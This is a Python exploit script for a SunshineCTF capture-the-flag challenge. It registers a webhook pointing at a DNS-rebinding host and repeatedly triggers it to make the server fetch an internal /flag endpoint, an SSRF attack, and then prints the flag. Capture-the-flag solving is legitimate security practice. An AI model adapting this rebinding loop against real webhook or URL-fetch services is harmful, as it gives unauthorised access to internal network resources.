#!/usr/bin/env python3
import os, sys, time, json, requests

BASE = "https://supernova.sunshinectf.games"

def register(url: str) -> str:
    r = requests.post(f"{BASE}/register", data={"url": url}, timeout=10)
    try:
        data = r.json()
    except Exception:
        print("Register raw:", r.status_code, r.text[:200])
        raise
    if r.status_code != 200:
        raise SystemExit(f"Register failed: {data}")
    print("[+] Registered:", data)
    return data["id"]

def trigger(webhook_id: str):
    r = requests.post(f"{BASE}/trigger", data={"id": webhook_id}, timeout=10)
    try:
        data = r.json()
    except Exception:
        print("Trigger raw:", r.status_code, r.text[:200])
        return None
    return data

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} http://<rebinding-host>:5001/flag")
        sys.exit(1)
    url = sys.argv[1]
    wid = register(url)
    print("[*] Starting trigger loop. Looking for 'sun{' in response...")
    for i in range(1, 501):
        data = trigger(wid)
        if not data:
            continue
        print(f"[{i:03}] status={data.get('status')} err={data.get('error')}")
        resp = (data.get("response") or "")[:200]
        if "sun{" in resp:
            print("[+] FLAG:", resp)
            break
        time.sleep(0.2)
    else:
        print("[-] No luck. Try registering again (DNS might have cached).")

if __name__ == "__main__":
    main()
